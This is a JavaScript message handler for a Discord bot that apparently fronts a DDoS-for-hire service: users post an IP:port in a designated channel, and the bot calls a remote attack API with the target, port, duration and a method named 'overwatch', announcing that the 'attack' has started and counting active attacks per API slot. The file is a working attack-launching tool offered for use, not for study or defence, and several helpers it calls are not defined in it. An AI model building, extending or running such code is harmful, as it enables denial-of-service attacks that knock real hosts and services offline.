const { isValidIP, isValidPort, isValidTime } = require('../utils/utils');
const { logSystemMessage } = require('../utils/logger');
const { logUserMessage } = require('../utils/userLog');
const { clearChannels } = require('../commands/clearCommand');

const handleNewMessage = async (message, client, logSystemMessage, logUserMessage) => {
    // Ignore messages sent by the bot itself
    if (message.author.id === client.user.id) return;

    // Ignore messages sent by a specific user ID
    const ignoreUserIds = ['1245778638515994718'];
    if (ignoreUserIds.includes(message.author.id)) {
        console.log(`Ignoring message from user ${message.author.id}`);
        return;
    }

    console.log(`Message received in channel ${message.channel.id} from author ${message.author.id}: ${message.content}`);

    const channelId = message.channel.id;
    const time = client.channelTimeMap[channelId];

    logSystemMessage(`Message received in channel ${channelId} from author ${message.author.id}: ${message.content}`);

    // Log the message to the user's log channel
    await logUserMessage(client, client.logServerId, message.author.username, message.author.id, `User Sent Message in channel id ${channelId}: ${message.content}`);

    if (message.content === 'clear-all{now}-{no_rate}0limit=1' && message.author.id === client.authorizedUserId) {
        await clearChannels(client, client.channelTimeMap);
        await message.channel.send({ content: 'All specified channels have been cleared.', ephemeral: true });
    } else if (time !== undefined) {
        await handleNewMessageLogic(message, time, client);
    }
};

const handleNewMessageLogic = async (message, time, client) => {
    console.log(`Handling new message in channel ${message.channel.id} with content: ${message.content}`);
    const ipPortRegex = /(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s*:\s*\d{1,5}\b)/;
    const match = message.content.match(ipPortRegex);

    if (match) {
        const [ip, port] = match[0].split(':').map(part => part.trim());
        console.log(`Parsed IP: ${ip}, Port: ${port}`);
        if (isValidIP(ip) && isValidPort(port)) {
            await message.delete();
            await sendRequest(message, ip, port, time, client);
        } else {
            console.log(`Invalid IP or port detected: IP - ${ip}, Port - ${port}`);
            await message.delete();
            await issueWarning(message.author, message.channel, client);
        }
    } else {
        console.log('No valid IP:Port found in message');
        await message.delete();
        await issueWarning(message.author, message.channel, client);
    }
};

const issueWarning = async (user, channel, client) => {
    if (!client.userWarnings[user.id]) {
        client.userWarnings[user.id] = 0;
    }

    client.userWarnings[user.id] += 1;
    const warningCount = client.userWarnings[user.id];

    console.log(`Warning issued to user ${user.tag}. Warning count: ${warningCount}`);
    logWarningMessage(`Warning issued to user ${user.tag}. Warning count: ${warningCount}`);
    await channel.send({ content: `Invalid IP or port. You have been issued a warning. Warning count: ${warningCount}/3`, ephemeral: true });

    if (warningCount >= 3) {
        await excludeUserFromCategory(user, channel.guild, client);
    }
};

const excludeUserFromCategory = async (user, guild, client) => {
    const role = guild.roles.cache.get(client.restrictedRoleId);
    if (role) {
        const member = guild.members.cache.get(user.id);
        if (member) {
            await member.roles.remove(role);
            console.log(`Role ${role.name} removed from user ${user.tag}`);
            logWarningMessage(`Role ${role.name} removed from user ${user.tag}`);
        } else {
            console.error(`Member not found: ${user.tag}`);
        }
    } else {
        console.error('Role not found.');
    }
};

const sendRequest = async (message, ip, port, time, client) => {
    const api = selectApi(client.apiDetails);
    if (!api) {
        logSystemMessage('No available API slots');
        await message.channel.send({ content: 'No available API slots. Please wait for an attack to complete.', ephemeral: true });
        return;
    }

    try {
        logSystemMessage(`Sending request to ${ip}:${port} for ${time} seconds`);

        // Increment active attacks
        api.activeAttacks += 1;

        const response = await axios.get(api.url, {
            params: {
                api_key: api.apiKey,
                user: api.userId,
                target: ip,
                time: time,
                port: port,
                method: 'overwatch',
            },
        });

        logSystemMessage(`API response received with status: ${response.status}`);
        await message.channel.send({ content: `Attack on ${ip}:${port} for ${time} seconds started successfully.`, ephemeral: true });

        // Decrement active attacks after the duration
        setTimeout(() => {
            api.activeAttacks -= 1;
            logActiveAttacks(client.apiDetails);
        }, time * 1000); // Convert time from seconds to milliseconds
    } catch (error) {
        api.activeAttacks -= 1;
        logActiveAttacks(client.apiDetails);
        console.error('Error making API request:', error);
        logSystemMessage(`Error making API request: ${error.message}`);
        await message.channel.send({ content: `Error making API request: ${error.message}`, ephemeral: true });
    }
};

module.exports = { handleNewMessage };
